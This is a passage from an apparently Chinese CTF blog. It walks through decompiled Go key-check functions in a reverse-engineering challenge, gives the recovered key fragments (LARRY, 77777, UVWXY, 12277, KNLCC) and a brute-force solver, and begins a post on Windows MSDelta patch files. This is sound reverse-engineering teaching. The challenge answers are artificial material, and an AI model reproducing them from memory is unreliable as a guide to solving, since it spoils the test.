<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.Monday</span></span><br><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __golang <span class="title function_">main_Monday</span><span class="params">(<span class="built_in">string</span> key, chan_bool check)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> cap; <span class="comment">// rdi</span></span><br><span class="line">  <span class="built_in">string</span> v5; <span class="comment">// kr00_16</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> elem[<span class="number">33</span>]; <span class="comment">// [rsp+1h] [rbp-31h] BYREF</span></span><br><span class="line">  runtime_hchan *c; <span class="comment">// [rsp+22h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+32h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="built_in">string</span> v10; <span class="comment">// 0:rbx.8,8:rcx.8</span></span><br><span class="line">  _slice_uint8 v11; <span class="comment">// 0:rax.8,8:rbx.8,16:rcx.8 OVERLAPPED</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(v2 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(<span class="number">0x49552D</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  c = check;</span><br><span class="line">  len = key.len;</span><br><span class="line">  v10.str = key.str;</span><br><span class="line">  v10.len = len;</span><br><span class="line">  v11 = runtime_stringtoslicebyte(&amp;elem[<span class="number">1</span>], v10);</span><br><span class="line">  cap = v11.cap;</span><br><span class="line">  v11.cap = v11.len;</span><br><span class="line">  v11.len = v11.<span class="built_in">array</span>;</span><br><span class="line">  v5 = encoding_base64__ptr_Encoding_EncodeToString(encoding_base64_StdEncoding, *&amp;v11.len);</span><br><span class="line">  v6 = v5.len == <span class="number">8</span> &amp;&amp; *v5.str == <span class="string">&#x27;=klUSFET&#x27;</span>;</span><br><span class="line">  elem[<span class="number">0</span>] = v6;</span><br><span class="line">  runtime_chansend1(c, elem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过信道<code>check</code>发送检测是否通过的信号<code>elem</code> 简单的base64编码 求出来的字节串是小端序 所以要逆转一下编码 得到第一个片段<code>LARRY</code></p>
<p>线程函数2:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.Tuesday</span></span><br><span class="line"><span class="type">void</span> __golang <span class="title function_">main_Tuesday</span><span class="params">(<span class="built_in">string</span> key, chan_bool check)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdi</span></span><br><span class="line">  uint8 v6; <span class="comment">// di</span></span><br><span class="line">  <span class="type">char</span> elem[<span class="number">9</span>]; <span class="comment">// [rsp+1h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+Ah] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(v2 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(<span class="number">0x49560D</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key.len &lt;= v3 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    v6 = key.str[v3];</span><br><span class="line">    elem[<span class="number">0</span>] = v6 &lt; <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= <span class="string">&#x27;0&#x27;</span> )</span><br><span class="line">      elem[<span class="number">0</span>] = key.str[v3] &gt; <span class="number">0x39</span>u;</span><br><span class="line">    <span class="keyword">if</span> ( elem[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_chansend1(check, &amp;runtime_egcbss);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = (key.str[v3++] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    v4 += v5;</span><br><span class="line">  &#125;</span><br><span class="line">  elem[<span class="number">0</span>] = v4 == <span class="number">35</span>;</span><br><span class="line">  runtime_chansend1(check, elem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检测每一位是否都是数字字符 然后将对应的数字求和结果需要为35 直接<code>77777</code></p>
<p>线程函数3:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.Wednesday</span></span><br><span class="line"><span class="type">void</span> __golang <span class="title function_">main_Wednesday</span><span class="params">(<span class="built_in">string</span> key, chan_bool check)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r14</span></span><br><span class="line">  __int128 v3; <span class="comment">// xmm15</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 len; <span class="comment">// rax</span></span><br><span class="line">  uint8 *v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// si</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+1h] [rbp-A9h] BYREF</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+2h] [rbp-A8h]</span></span><br><span class="line">  __int128 v11[<span class="number">2</span>]; <span class="comment">// [rsp+Ah] [rbp-A0h] BYREF</span></span><br><span class="line">  runtime_tmpBuf v12; <span class="comment">// [rsp+2Ah] [rbp-80h] BYREF</span></span><br><span class="line">  runtime_tmpBuf buf; <span class="comment">// [rsp+4Ah] [rbp-60h] BYREF</span></span><br><span class="line">  runtime_hchan *c; <span class="comment">// [rsp+6Ah] [rbp-40h]</span></span><br><span class="line">  runtime_hmap h; <span class="comment">// [rsp+72h] [rbp-38h] BYREF</span></span><br><span class="line">  uint8 *keya; <span class="comment">// [rsp+B2h] [rbp+8h]</span></span><br><span class="line">  <span class="built_in">string</span> v17; <span class="comment">// 0:rax.8,8:rbx.8</span></span><br><span class="line">  <span class="built_in">string</span> v18; <span class="comment">// 0:rbx.8,8:rcx.8</span></span><br><span class="line">  _slice_uint8 v19; <span class="comment">// 0:rax.8,8:rbx.8,16:rcx.8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;buf[<span class="number">24</span>] &lt;= *(v2 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(<span class="number">0x49582D</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  keya = key.str;</span><br><span class="line">  c = check;</span><br><span class="line">  *&amp;h.count = v3;</span><br><span class="line">  h.oldbuckets = *(&amp;v3 + <span class="number">1</span>);</span><br><span class="line">  *&amp;h.nevacuate = v3;</span><br><span class="line">  v11[<span class="number">0</span>] = v3;</span><br><span class="line">  v11[<span class="number">1</span>] = v3;</span><br><span class="line">  h.buckets = v11;</span><br><span class="line">  h.hash0 = runtime_fastrand();</span><br><span class="line">  len = key.len;</span><br><span class="line">  v5 = keya;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( len &lt;= v6 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    v7 = v5[v6];</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; <span class="string">&#x27;A&#x27;</span> || v7 &gt; <span class="string">&#x27;Z&#x27;</span> || (v10 = v6, v9 = v7, *runtime_mapaccess1(&amp;RTYPE_map_uint8_bool_0, &amp;h, &amp;v9)) )</span><br><span class="line">    &#123;</span><br><span class="line">      runtime_chansend1(c, &amp;runtime_egcbss);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = keya[v10];</span><br><span class="line">    *runtime_mapassign(&amp;RTYPE_map_uint8_bool_0, &amp;h, &amp;v9) = <span class="number">1</span>;</span><br><span class="line">    v6 = v10 + <span class="number">1</span>;</span><br><span class="line">    len = key.len;</span><br><span class="line">    v5 = keya;</span><br><span class="line">  &#125;</span><br><span class="line">  v18.str = v5;</span><br><span class="line">  v18.len = len;</span><br><span class="line">  v19 = runtime_stringtoslicebyte(buf, v18);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v19.len &lt;= i )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    v19.<span class="built_in">array</span>[i] ^= <span class="number">0x60</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = runtime_slicebytetostring(v12, v19.<span class="built_in">array</span>, v19.len);</span><br><span class="line">  main_Tuesday(v17, c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检测key是否全部都是大写字母 在<code>runtime_hmap h</code>为每个字母建立一个映射 如果检测到当前字母在map中已经是存在的key就退出 通过这层检测后将每个字母异或0x60然后调用线程函数2 因为不能用重复的字母 所以这段key可以为<code>UVWXY</code></p>
<p>线程函数4:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.Thursday</span></span><br><span class="line"><span class="type">void</span> __golang <span class="title function_">main_Thursday</span><span class="params">(<span class="built_in">string</span> key, chan_bool check)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  __int64 v8; <span class="comment">// r8</span></span><br><span class="line">  __int64 v9; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">char</span> elem[<span class="number">33</span>]; <span class="comment">// [rsp+1h] [rbp-31h] BYREF</span></span><br><span class="line">  runtime_hchan *c; <span class="comment">// [rsp+22h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+32h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="built_in">string</span> v14; <span class="comment">// 0:rbx.8,8:rcx.8</span></span><br><span class="line">  _slice_uint8 v15; <span class="comment">// 0:rax.8,8:rbx.8,16:rcx.8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(v2 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    JUMPOUT(<span class="number">0x495929</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  c = check;</span><br><span class="line">  len = key.len;</span><br><span class="line">  v14.str = key.str;</span><br><span class="line">  v14.len = len;</span><br><span class="line">  v15 = runtime_stringtoslicebyte(&amp;elem[<span class="number">1</span>], v14);</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v15.len &lt;= v4 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">for</span> ( i = v15.<span class="built_in">array</span>[v4]; i; i = v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v5-- + <span class="number">1</span>;</span><br><span class="line">      v9 = v6-- + <span class="number">1</span>;</span><br><span class="line">      v10 = i;</span><br><span class="line">      <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        v5 = v8;</span><br><span class="line">      <span class="keyword">if</span> ( (i &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">        v6 = v9;</span><br><span class="line">      LOBYTE(v10) = i &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  elem[<span class="number">0</span>] = v5 == <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">5</span> )</span><br><span class="line">    elem[<span class="number">0</span>] = v6 == <span class="number">3</span>;</span><br><span class="line">  runtime_chansend1(c, elem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据每个字符的有效位对两个计数器进行操作 要求最后这两个计数器到达一定的数值 简单分析一下可以知道如果字符在A-Z范围内不可逆达到这种结果 直接用数字字符爆破:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> a = <span class="string">&#x27;1&#x27;</span>; a &lt;= <span class="string">&#x27;9&#x27;</span>; a++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> b = <span class="string">&#x27;1&#x27;</span>; b &lt;= <span class="string">&#x27;9&#x27;</span>; b++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> c = <span class="string">&#x27;1&#x27;</span>; c &lt;= <span class="string">&#x27;9&#x27;</span>; c++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> d = <span class="string">&#x27;1&#x27;</span>; d &lt;= <span class="string">&#x27;9&#x27;</span>; d++)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> e = <span class="string">&#x27;1&#x27;</span>; e &lt;= <span class="string">&#x27;9&#x27;</span>; e++)&#123;</span><br><span class="line">                        <span class="type">char</span> table[<span class="number">5</span>] = &#123;a, b, c, d, e&#125;;</span><br><span class="line">                        <span class="type">int</span> v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v7 = <span class="number">0</span>, v8 = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">                            <span class="keyword">while</span>(table[i])&#123;</span><br><span class="line">                                v10 = v7-- + <span class="number">1</span>;</span><br><span class="line">                                v11 = v8-- + <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">if</span>(table[i] &amp; <span class="number">1</span>)&#123;</span><br><span class="line">                                    v7 = v10;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span>(table[i] &amp; <span class="number">2</span>)&#123;</span><br><span class="line">                                    v8 = v11;</span><br><span class="line">                                &#125;</span><br><span class="line">                                table[i] &gt;&gt;= <span class="number">2</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(v7 == <span class="number">5</span> &amp;&amp; v8 == <span class="number">3</span>)&#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c%c %d %d\n&quot;</span>, a, b, c, d, e, v7, v8);</span><br><span class="line">                            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 12277 5 3</span></span><br></pre></td></tr></table></figure>

<p>线程函数5:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __golang <span class="title function_">main_Friday</span><span class="params">(<span class="built_in">string</span> key, chan_bool check)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> count; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> r; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sr; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> srs1; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> f_i_j; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">int</span> rr; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v20; <span class="comment">// r10</span></span><br><span class="line">  internal_abi_Type_0 *v21; <span class="comment">// [rsp+18h] [rbp-C8h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v22; <span class="comment">// [rsp+20h] [rbp-C0h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+28h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">void</span> *v24; <span class="comment">// [rsp+30h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> f0t5[<span class="number">2</span>]; <span class="comment">// [rsp+38h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [rsp+48h] [rbp-98h]</span></span><br><span class="line">  <span class="type">int</span> f0t5_[<span class="number">9</span>]; <span class="comment">// [rsp+50h] [rbp-90h]</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [rsp+98h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [rsp+C0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v30; <span class="comment">// [rsp+C8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> keya; <span class="comment">// [rsp+E8h] [rbp+8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> key_8; <span class="comment">// [rsp+F0h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;v28 &lt;= *(v5 + <span class="number">16LL</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  key_8 = v4;</span><br><span class="line">  keya = v2;</span><br><span class="line">  f0t5[<span class="number">1LL</span>] = v3;</span><br><span class="line">  qmemcpy(&amp;v24 + <span class="number">2LL</span>, <span class="string">&quot;UNL0CK&quot;</span>, <span class="number">6LL</span>);</span><br><span class="line">  v6 = sub_45E299(&amp;v21);</span><br><span class="line">  count = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( count &lt; <span class="number">6LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    f0t5[<span class="number">0LL</span>] = count;</span><br><span class="line">    v24 = runtime_makeslice(v21, v22, v23);</span><br><span class="line">    v8 = f0t5[<span class="number">0LL</span>];</span><br><span class="line">    v9 = <span class="number">3LL</span> * f0t5[<span class="number">0LL</span>];</span><br><span class="line">    f0t5_[v9] = <span class="number">7LL</span>;</span><br><span class="line">    f0t5_[v9 + <span class="number">1LL</span>] = <span class="number">7LL</span>;</span><br><span class="line">    f0t5_[v9 - <span class="number">1LL</span>] = v10;</span><br><span class="line">    count = v8 + <span class="number">1LL</span>;</span><br><span class="line">    v6 = keya;</span><br><span class="line">    v4 = key_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">6LL</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !f0t5_[<span class="number">3LL</span> * i] )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    *f0t5_[<span class="number">3LL</span> * i - <span class="number">1LL</span>] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt; <span class="number">7LL</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( j &gt;= f0t5_[<span class="number">0LL</span>] )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    *(v26 + <span class="number">8LL</span> * j) = j;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( r = <span class="number">1LL</span>; r &lt; <span class="number">6LL</span>; ++r )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( sr = <span class="number">1LL</span>; sr &lt; <span class="number">7LL</span>; ++sr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= r - <span class="number">1LL</span> )</span><br><span class="line">        runtime_panicIndex();</span><br><span class="line">      srs1 = sr - <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;v24 + sr + <span class="number">1LL</span>) == *(r + v6 - <span class="number">1LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( f0t5[<span class="number">3LL</span> * r] &lt;= srs1 )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        <span class="keyword">if</span> ( sr &gt;= f0t5_[<span class="number">3LL</span> * r] )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        *(f0t5_[<span class="number">3LL</span> * r - <span class="number">1LL</span>] + <span class="number">8LL</span> * sr) = *((f0t5[<span class="number">3LL</span> * r - <span class="number">1LL</span>] + <span class="number">8LL</span> * sr) - <span class="number">8LL</span>);<span class="comment">// 如果 enc[sr - 1] == input[r - 1]</span></span><br><span class="line">                                                <span class="comment">// f0t5[r][sr] = f0t5[r][sr-1]</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v16 = f0t5[<span class="number">3LL</span> * r - <span class="number">1LL</span>];</span><br><span class="line">        <span class="keyword">if</span> ( sr &gt;= f0t5[<span class="number">3LL</span> * r] )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        v17 = f0t5_[<span class="number">3LL</span> * r];</span><br><span class="line">        f_i_j = *(v16 + <span class="number">8LL</span> * sr);</span><br><span class="line">        rr = f0t5_[<span class="number">3LL</span> * r - <span class="number">1LL</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v17 &lt;= srs1 )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        v20 = *(v16 + <span class="number">8LL</span> * sr - <span class="number">8LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( *(rr + <span class="number">8LL</span> * sr - <span class="number">8LL</span>) &lt; f_i_j )   <span class="comment">// f0t5[r][sr-1] &lt; f0t5[r][sr]</span></span><br><span class="line">          f_i_j = *(rr + <span class="number">8LL</span> * sr - <span class="number">8LL</span>);       <span class="comment">// min = f0t5[s][sr-1]</span></span><br><span class="line">        <span class="keyword">if</span> ( v20 &lt; f_i_j )</span><br><span class="line">          f_i_j = v20;</span><br><span class="line">        <span class="keyword">if</span> ( sr &gt;= v17 )</span><br><span class="line">          runtime_panicIndex();</span><br><span class="line">        *(rr + <span class="number">8LL</span> * sr) = f_i_j + <span class="number">1LL</span>;         <span class="comment">// f0t5[r][sr] = min + 1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v30 &lt;= <span class="number">6LL</span> )</span><br><span class="line">    runtime_panicIndex();</span><br><span class="line">  BYTE1(v24) = *(v29 + <span class="number">48LL</span>) == <span class="number">3LL</span>;            <span class="comment">// f0t5[5][6] == 3</span></span><br><span class="line">  runtime_chansend1(v21, v22);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初始化一个6 * 7的矩阵 第0列的值初始化为0-7 第1行初始化为0-5 然后要求处理完后matrix[5][6]的值是3 可以直接拼出key来<code>KNLCC</code></p>
<p>要动调类似的不对同一个数据操作所以多线程并行的程序 需要在每个线程函数的入口下断点 然后在动调时切换到除主函数以外的线程函数的界面 发现在等待运行的线程锁内 进行步出会到达某个函数的入口断点 这时候对除了主线程以外的线程暂停 否则可能会因为其他线程先处理完数据而程序因为发送到信道的信号直接退出</p>
<h2 id="patchflag-Windows内核逆向"><a href="#patchflag-Windows内核逆向" class="headerlink" title="patchflag | Windows内核逆向"></a>patchflag | Windows内核逆向</h2><p><a href="https://1k0ct.github.io/2024/04/29/Windows%E5%B7%AE%E5%BC%82%E5%8C%96%E8%A1%A5%E4%B8%81MSDelta%E4%B9%8B%E7%A0%94%E7%A9%B6/#%E6%89%93%E8%A1%A5%E4%B8%81">Msdelta.dll研究</a></p>
<p>剩下的题目待复现…</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>REV</category>
        <category>WPs</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows差异化补丁MSDelta之研究</title>
    <url>/2024/04/29/Windows%E5%B7%AE%E5%BC%82%E5%8C%96%E8%A1%A5%E4%B8%81MSDelta%E4%B9%8B%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>msdelta.dll</code>包含了一系列用于对文件进行补丁操作的API 鉴于网上资料极少且<a href="https://learn.microsoft.com/en-us/windows/win32/devnotes/msdelta">官方文档</a>简陋 记录一下学习过程</p>
<span id="more"></span>

<h2 id="Patch-补丁"><a href="#Patch-补丁" class="headerlink" title="Patch(补丁)"></a>Patch(补丁)</h2><p>对于<code>msdelta.dll</code>中的Patch 它为一个字节流 产生于一个原字节流<code>Source</code>和目标字节流<code>Target</code> 可以用这个<a href="https://github.com/ritsec/RITSEC-CTF-2019/blob/master/Misc/patch-tuesday/make_delta.py">Python wrapper</a>来产生一个从源文件到目标文件的补丁文件</p>
<p>整体上它记录了补丁前后内容的差异 一个对<code>Delta_Patch</code>结构体包含信息的描述如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DELTA_HEADER_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/** Used file type set. */</span></span><br><span class="line">    DELTA_FILE_TYPE FileTypeSet;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Source file type. */</span></span><br><span class="line">    DELTA_FILE_TYPE FileType;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Delta flags. */</span></span><br><span class="line">    DELTA_FLAG_TYPE Flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Size of target file in bytes. */</span></span><br><span class="line">    SIZE_T  TargetSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Time of target file. */</span></span><br><span class="line">    FILETIME TargetFileTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Algorithm used for hashing. */</span></span><br><span class="line">    ALG_ID TargetHashAlgId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Target hash. */</span></span><br><span class="line">    DELTA_HASH TargetHash;</span><br><span class="line"></span><br><span class="line">&#125; DELTA_HEADER_INFO;</span><br></pre></td></tr></table></figure>

<p>用这个Wrapper可以方便地执行获取补丁信息和打补丁的操作:</p>
